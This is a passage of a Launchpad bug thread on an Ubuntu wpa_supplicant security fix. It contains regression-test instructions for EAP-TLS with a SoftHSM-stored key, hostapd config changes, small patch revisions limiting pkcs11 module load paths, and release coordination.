    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;m adding instructions on how to test with a real PKCS11 module, which we&#x27;re using for regression testing. Incidentally, my original suggestion of passing /proc/self/fd does not work. The module path is reloaded when EAP is performed, by which time tls_engine_<wbr />load_dynamic_<wbr />pkcs11 would have returned and I would have closed the file descriptor.</p>
<p>The following setup gets wpasupplicant to perform 802.1x EAP-TLS authentication using a private key stored using SoftHSM.</p>
<p>Requirements: wpasupplicant, hostapd, softhsm2, gnutls-bin (just for a utility).</p>
<p>Notes: run everything as root.</p>
<p>1. Generate a CA:<br />
openssl req -new -x509 -nodes -keyout ca.key -out ca.crt</p>
<p>2. Initialise a slot:<br />
softhsm2-util --init-token --free --label &quot;token-label&quot;</p>
<p>3. Generate key in the token (the ID you select here needs to be referenced in subsequent openssl commands):<br />
pkcs11-tool --module /usr/lib/<wbr />x86_64-<wbr />linux-gnu/<wbr />softhsm/<wbr />libsofthsm2.<wbr />so -l --token-label &quot;token-label&quot; -k --key-type rsa:2048 --id 1234 --label &quot;key-label&quot;</p>
<p>3. Generate CSR from key in slot:<br />
openssl req -new -nodes -out client.csr -engine  pkcs11 -keyform engine -key 1234</p>
<p>4. Generate client certificate by signing above CSR with the CA key:<br />
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -out client.crt</p>
<p>5. Generate server key and CSR:<br />
openssl req -new -nodes -keyout server.key -out server.csr</p>
<p>6. Generate server certificate by signing server CSR with the CA key:<br />
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -out server.crt</p>
<p>7. Get pkcs11 URI for the client&#x27;s private key (search for the token label &quot;token-label&quot;)<br />
p11tool --list-tokens</p>
<p>8. Generate veth pair and raise the interfaces (this is where we&#x27;ll be getting wpa_supplicant to talk to hostapd (acting as both authenticator and EAP server)):<br />
ip link add veth-client type veth peer name veth-server<br />
ip link set veth-client up<br />
ip li set veth-server up</p>
<p>9. Use the following for wpa_supplicant config (adapt paths and private key URI):</p>
<p>pkcs11_<wbr />engine_<wbr />path=/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/engines-<wbr />3/pkcs11.<wbr />so<br />
pkcs11_<wbr />module_<wbr />path=/usr/<wbr />lib/x86_<wbr />64-linux-<wbr />gnu/softhsm/<wbr />libsofthsm2.<wbr />so</p>
<p>network={<br />
&nbsp;&nbsp;&nbsp;&nbsp;disabled=0<br />
&nbsp;&nbsp;&nbsp;&nbsp;key_<wbr />mgmt=IEEE8021X<br />
&nbsp;&nbsp;&nbsp;&nbsp;eap=TLS<br />
&nbsp;&nbsp;&nbsp;&nbsp;identity=&quot;none&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;ca_<wbr />cert=&quot;/<wbr />root/certs/<wbr />ca.crt&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;client_<wbr />cert=&quot;/<wbr />root/certs/<wbr />client.<wbr />crt&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;private_<wbr />key=&quot;pkcs11:<wbr />model=SoftHSM%<wbr />20v2;manufactur<wbr />er=SoftHSM%<wbr />20project;<wbr />serial=<wbr />838c0b343825f1c<wbr />5;token=<wbr />token-label&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;pin=&quot;1234&quot;<br />
}</p>
<p>10. Generate simple EAP users file for hostapd, forcing EAP-TLS for everyone:<br />
echo &quot;* TLS&quot; &gt;eap.user</p>
<p>11. Use the following for hostapd config (I&#x27;m using the packaged example as a base and showing differences; adapt paths and interface name):<br />
# diff -Naur /usr/share/<wbr />doc/hostapd/<wbr />examples/<wbr />hostapd.<wbr />conf hostapd.conf<br />
--- /usr/share/<wbr />doc/hostapd/<wbr />examples/<wbr />hostapd.<wbr />conf	2022-01-16 22:51:29.000000000 +0200<br />
+++ hostapd.conf	2024-08-02 14:38:44.285931906 +0300<br />
@@ -5,7 +5,7 @@<br />
&nbsp;# management frames with the Host AP driver); wlan0 with many nl80211 drivers<br />
&nbsp;# Note: This attribute can be overridden by the values supplied with the &#x27;-i&#x27;<br />
&nbsp;# command line parameter.<br />
-interface=wlan0<br />
+interface=<wbr />veth-server</p>
<p>&nbsp;# In case of atheros and nl80211 driver interfaces, an additional<br />
&nbsp;# configuration parameter, bridge, may be use...</p></div>
    
    <p>
      <a href="/ubuntu/+source/wpa/+bug/2067613/comments/28">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I'm adding instructions on how to test with a real PKCS11 module, which we're using for regression testing. Incidentally, my original suggestion of passing /proc/self/fd does not work. The module path is reloaded when EAP is performed, by which time tls_engine_load_dynamic_pkcs11 would have returned and I would have closed the file descriptor.

The following setup gets wpasupplicant to perform 802.1x EAP-TLS authentication using a private key stored using SoftHSM.

Requirements: wpasupplicant, hostapd, softhsm2, gnutls-bin (just for a utility).

Notes: run everything as root.

1. Generate a CA:
openssl req -new -x509 -nodes -keyout ca.key -out ca.crt

2. Initialise a slot:
softhsm2-util --init-token --free --label "token-label"

3. Generate key in the token (the ID you select here needs to be referenced in subsequent openssl commands):
pkcs11-tool --module /usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so -l --token-label "token-label" -k --key-type rsa:2048 --id 1234 --label "key-label"

3. Generate CSR from key in slot:
openssl req -new -nodes -out client.csr -engine  pkcs11 -keyform engine -key 1234

4. Generate client certificate by signing above CSR with the CA key:
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -out client.crt

5. Generate server key and CSR:
openssl req -new -nodes -keyout server.key -out server.csr

6. Generate server certificate by signing server CSR with the CA key:
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -out server.crt

7. Get pkcs11 URI for the client's private key (search for the token label "token-label")
p11tool --list-tokens

8. Generate veth pair and raise the interfaces (this is where we'll be getting wpa_supplicant to talk to hostapd (acting as both authenticator and EAP server)):
ip link add veth-client type veth peer name veth-server
ip link set veth-client up
ip li set veth-server up


9. Use the following for wpa_supplicant config (adapt paths and private key URI):

pkcs11_engine_path=/usr/lib/x86_64-linux-gnu/engines-3/pkcs11.so
pkcs11_module_path=/usr/lib/x86_64-linux-gnu/softhsm/libsofthsm2.so

network={
    disabled=0
    key_mgmt=IEEE8021X
    eap=TLS
    identity="none"
    ca_cert="/root/certs/ca.crt"
    client_cert="/root/certs/client.crt"
    private_key="pkcs11:model=SoftHSM%20v2;manufacturer=SoftHSM%20project;serial=838c0b343825f1c5;token=token-label"
    pin="1234"
}

10. Generate simple EAP users file for hostapd, forcing EAP-TLS for everyone:
echo "* TLS" &gt;eap.user

11. Use the following for hostapd config (I'm using the packaged example as a base and showing differences; adapt paths and interface name):
# diff -Naur /usr/share/doc/hostapd/examples/hostapd.conf hostapd.conf 
--- /usr/share/doc/hostapd/examples/hostapd.conf	2022-01-16 22:51:29.000000000 +0200
+++ hostapd.conf	2024-08-02 14:38:44.285931906 +0300
@@ -5,7 +5,7 @@
 # management frames with the Host AP driver); wlan0 with many nl80211 drivers
 # Note: This attribute can be overridden by the values supplied with the '-i'
 # command line parameter.
-interface=wlan0
+interface=veth-server
 
 # In case of atheros and nl80211 driver interfaces, an additional
 # configuration parameter, bridge, may be used to notify hostapd if the
@@ -24,7 +24,7 @@
 # default: hostap). nl80211 is used with all Linux mac80211 drivers.
 # Use driver=none if building hostapd as a standalone RADIUS server that does
 # not control any wireless/wired driver.
-# driver=hostap
+driver=wired
 
 # Driver interface parameters (mainly for development testing use)
 # driver_params=&lt;params&gt;
@@ -53,7 +53,7 @@
 logger_syslog=-1
 logger_syslog_level=2
 logger_stdout=-1
-logger_stdout_level=2
+logger_stdout_level=0
 
 # Interface for separate control program. If this is specified, hostapd
 # will create this directory and a UNIX domain socket for listening to requests
@@ -976,7 +976,7 @@
 ##### IEEE 802.1X-2004 related configuration ##################################
 
 # Require IEEE 802.1X authorization
-#ieee8021x=1
+ieee8021x=1
 
 # IEEE 802.1X/EAPOL version
 # hostapd is implemented based on IEEE Std 802.1X-2004 which defines EAPOL
@@ -1089,25 +1089,25 @@
 # Use integrated EAP server instead of external RADIUS authentication
 # server. This is also needed if hostapd is configured to act as a RADIUS
 # authentication server.
-eap_server=0
+eap_server=1
 
 # Path for EAP server user database
 # If SQLite support is included, this can be set to "sqlite:/path/to/sqlite.db"
 # to use SQLite database instead of a text file.
-#eap_user_file=/etc/hostapd.eap_user
+eap_user_file=/root/certs/eap.user
 
 # CA certificate (PEM or DER file) for EAP-TLS/PEAP/TTLS
-#ca_cert=/etc/hostapd.ca.pem
+ca_cert=/root/certs/ca.crt
 
 # Server certificate (PEM or DER file) for EAP-TLS/PEAP/TTLS
-#server_cert=/etc/hostapd.server.pem
+server_cert=/root/certs/server.crt
 
 # Private key matching with the server certificate for EAP-TLS/PEAP/TTLS
 # This may point to the same file as server_cert if both certificate and key
 # are included in a single file. PKCS#12 (PFX) file (.p12/.pfx) can also be
 # used by commenting out server_cert and specifying the PFX file as the
 # private_key.
-#private_key=/etc/hostapd.server.prv
+private_key=/root/certs/server.key
 
 # Passphrase for private key
 #private_key_passwd=secret passphrase

12. Run hostapd:
hostapd -dd hostapd.conf 

13. Run wpa_supplicant (check output for EAP result)
wpa_supplicant -iveth-client -c wpa.cfg -Dwired -dd

[...]
EAP: EAP entering state SUCCESS
veth-client: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully

14. An easy way for test authentication failure is to generate a self-signed certificate for the same client key in SoftHSM:
openssl req -x509 -new -nodes -out client-bad.crt -engine pkcs11 -keyform engine -key 1234


Note: the pkcs11 URIs should work with wpasupplicant 2.4+. For older, check out the example here: https://w1.fi/cgit/hostap/plain/wpa_supplicant/examples/openCryptoki.conf
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T12:35:23.634579+00:00" title="2024-08-02 12:35:23 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>For testing Marc&#x27;s patch, just copy any of the modules somewhere other than under /usr/lib/ and pass those paths to wpa_supplicant&#x27;s config file.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">For testing Marc's patch, just copy any of the modules somewhere other than under /usr/lib/ and pass those paths to wpa_supplicant's config file.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma (sudhackar)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T12:38:15.469019+00:00" title="2024-08-02 12:38:15 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5802129/+files/lib_engine_trusted_path.patch" class="sprite haspatch-icon">lib_engine_trusted_path.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5802129">Edit</a>
        
        (3.5 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>A little fix to #21 based on some testing</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">A little fix to #21 based on some testing

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T12:55:15.715991+00:00" title="2024-08-02 12:55:15 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">
                <a href="#" class="editable-message-last-edit-link">(last edit <time itemprop="editTime" datetime="2024-08-02T15:26:38.380675+00:00" title="2024-08-02 15:26:38 UTC">on 2024-08-02</time>)</a>:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Small suggestion to patch in #30 - add the following to the else branch, so that there&#x27;s a message for either branch:</p>
<p>&nbsp;wpa_printf(<wbr />MSG_DEBUG, &quot;ENGINE: Loading pkcs11 Engine from %s&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pkcs11_<wbr />so_path)<wbr />;</p>
<p>This debug message used to be outside the if/else blocks.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Small suggestion to patch in #30 - add the following to the else branch, so that there's a message for either branch:

	wpa_printf(MSG_DEBUG, "ENGINE: Loading pkcs11 Engine from %s",
		   pkcs11_so_path);

This debug message used to be outside the if/else blocks.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma (sudhackar)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-03T07:27:25.220779+00:00" title="2024-08-03 07:27:25 UTC">on 2024-08-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+attachment/5802232/+files/lib_engine_trusted_path.patch" class="sprite haspatch-icon">lib_engine_trusted_path.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/wpa/+bug/2067613/+attachment/5802232">Edit</a>
        
        (3.6 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fixed as per #31</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fixed as per #31</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-05T18:15:54.491868+00:00" title="2024-08-05 18:15:54 UTC">on 2024-08-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>We intend to release updates for this issue tomorrow, August 6th, at 16:00 UTC. Could you please let us know if this is an issue?</p>
<p>Thanks!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">We intend to release updates for this issue tomorrow, August 6th, at 16:00 UTC. Could you please let us know if this is an issue?

Thanks!</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-06T20:44:08.591279+00:00" title="2024-08-06 20:44:08 UTC">on 2024-08-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On the Ubuntu side, USN-6945-1 was sent out for this issue. We&#x27;ll publish the CVE data shortly. Rory, if you have a blog post published, we can link it, too.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On the Ubuntu side, USN-6945-1 was sent out for this issue. We'll publish the CVE data shortly. Rory, if you have a blog post published, we can link it, too.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma (sudhackar)</a>
    
    <time title="2024-08-07 07:01:41 UTC" datetime="2024-08-07T07:01:41.726099+00:00">on 2024-08-07</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in wpa (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Sudhakar Verma (sudhackar)
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~andrew.sh" class="sprite person">Andrej Shadura (andrew.sh)</a>
    
    <time title="2024-08-07 07:26:25 UTC" datetime="2024-08-07T07:26:25.209803+00:00">on 2024-08-07</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in wpa (Debian): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Andrej Shadura (andrew.sh)
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; High
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~rmcnamara-snyk" class="sprite person">Rory McNamara (rmcnamara-snyk)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-07T08:18:54.822298+00:00" title="2024-08-07 08:18:54 UTC">on 2024-08-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@lucistanescu Thanks! Our blog post has been slightly delayed so please don&#x27;t wait on it, I&#x27;ll update when it&#x27;s been published and it can be linked if appropriate.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@lucistanescu Thanks! Our blog post has been slightly delayed so please don't wait on it, I'll update when it's been published and it can be linked if appropriate.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lucistanescu" class="sprite person">Luci Stanescu (lucistanescu)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-07T13:26:34.592823+00:00" title="2024-08-07 13:26:34 UTC">on 2024-08-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks, Rory! We had in the mean time published the CVE record, too, but definitely happy to update it once your blog post is up - just give us a ping.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks, Rory! We had in the mean time published the CVE record, too, but definitely happy to update it once your blog post is up - just give us a ping.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/37" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~rmcnamara-snyk" class="sprite person">Rory McNamara (rmcnamara-snyk)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-11T08:31:58.033646+00:00" title="2024-09-11 08:31:58 UTC">on 2024-09-11</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/wpa/+bug/2067613/comments/37"> #37</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

